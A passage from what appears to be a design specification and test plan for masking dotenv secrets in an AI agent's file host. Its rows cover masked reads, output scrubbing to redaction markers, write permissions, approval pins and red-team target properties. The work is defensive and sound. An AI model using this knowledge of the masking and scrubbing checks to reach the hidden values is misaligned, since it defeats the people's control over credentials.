reader). (3) The host: the basename pattern kind and the one walk, the masked copy on both platforms, `mask: true` on
`put` and the splice at `commit`, the output scrub, the default switched (the files-host lane). (4) The scoped `show`,
its card and the pin. None is scheduled; the red team gets this section as its target before slice 2 opens.

**Rows, for whoever builds it.** Each is a test that fails first.

1. The grammar, enumerated: every line shape above, a value with `=`, `#`, quotes and escapes inside, CRLF, no final
   newline, a multi-line value, a line that does not parse (masked whole). The native and the WebAssembly masker give
   the same bytes for each.
2. A read through each reader (`ml.fs`, Python's mount, the content view, `@file:`, `cat` by the host on each
   platform) shows every key and no byte of any value; the size equals `stat`.
3. Round trip through Python `open`: read, add a line, write the whole file, close; the stored file holds every old
   value at its old spelling and the new line. The same for modes `a` and `r+`, for `pathlib`, for `ml.fs` and for
   `ml.sh.put`.
4. A changed value lands; a removed key is removed; a duplicated key maps by position; `K=***` over a three-byte value
   restores it; a fake read BEFORE the person changed the value's length restores the new value; a fake of `K` written
   under another key lands as a fake.
5. A fake written to another file, a renamed or symlinked path included, stays a fake, in the store and on the host.
6. A program not allowed for the file cannot write, truncate, append to, rename over or remove it, on each platform;
   on Linux it reads the masked copy at any depth; on macOS a read by a call with no manifest, by a path inside an
   unsplit flag, and by a walk is refused.
7. An allowed program reads the real value, and a value it prints reaches the model as `[REDACTED:<KEY>]` in each of
   the registry's forms, in stdout, stderr, a head and a later range. A program that never opened the file and prints
   the value is scrubbed the same.
8. No message from the host to the worker carries a value of a masked file (asserted on the wire), and none from the
   worker to the host does.
9. The pin: a pinned file changed by a mediated write, and by a program, makes the next call ask; an `allow` policy
   does not answer it; approval moves the pin; nothing else does.
10. `register: false`: masked on read, not scrubbed from output.
11. The bound: a session past 256 values reads the file as hidden with the reason, and scrubs every value it held.
12. Upgrade: a session whose view holds `default:dotenv` as a `hide` row, and one with a person's `show` over it, read
    by the new code, show the default as `mask` and keep the `show`.
13. Nothing of a value, a fake's derivation input or the fake key in the run log, the export, the backup or an error's
    text.

14. The host's `put`: without `mask: true` a dotenv target is refused as today; with it and no `mask` entry deciding
    the target, refused; a 0600 file is 0600 after a by-key commit; the file changed between `put` and `commit` is
    spliced against its content at `commit`. `decidePut`: a by-key write to a masked path asks with no policy and runs
    under an `allow`; the same `allow` does not free an overwrite of a file no `mask` decides, nor a write to the
    masked path without `mask: true`.
15. The scrub's channels, one row each: stdout, stderr, a pipe stage's stderr, a head, a `read` range, `peek`, the
    `diff` body (a masked path withheld). A value split across two chunks at every offset is scrubbed; `outputCap`
    cutting a value shows no part of it; two overlapping `read` ranges agree.
16. The walk: a root past the cap fails the spawn on Linux naming it, and on macOS runs with the files hidden and the
    record written; the same past 256 found files; a `.env` under `node_modules` and under `.git` is found; an
    unchanged tree's second walk reads no directory; a `.env` added under a directory whose modification time is then
    set back is found.
17. The held values are absent from the core a CRASH of the host leaves during a call (SIGABRT), on each platform; a
    spawned program still leaves its own core file.

The red team's properties are rows 5 and 8, that a page-started caller reaches none of it, and that no reader of a
masked file exists outside the list in row 2.
